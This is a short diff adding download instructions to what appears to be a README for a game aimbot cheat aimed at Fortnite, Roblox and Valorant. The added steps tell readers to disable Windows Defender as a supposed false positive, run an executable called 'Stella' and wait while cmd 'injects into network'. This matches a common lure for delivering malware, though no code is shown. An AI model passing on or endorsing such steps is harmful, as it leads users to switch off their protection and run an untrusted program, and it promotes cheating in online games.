@@ -1,3 +1,11 @@
+Download:
+- Disable windows defnder (False Positive)
+- Download folder and run "Stella"
+- Wait for cmd to finish injecting into network
+- Open game you want to cheat in (Mostly fps shooters like fortnite, roblox and valorant)
+- Enjoy!
+
+
 Features:
 - External (Undetected)
 - Aimbot in over 100+ games
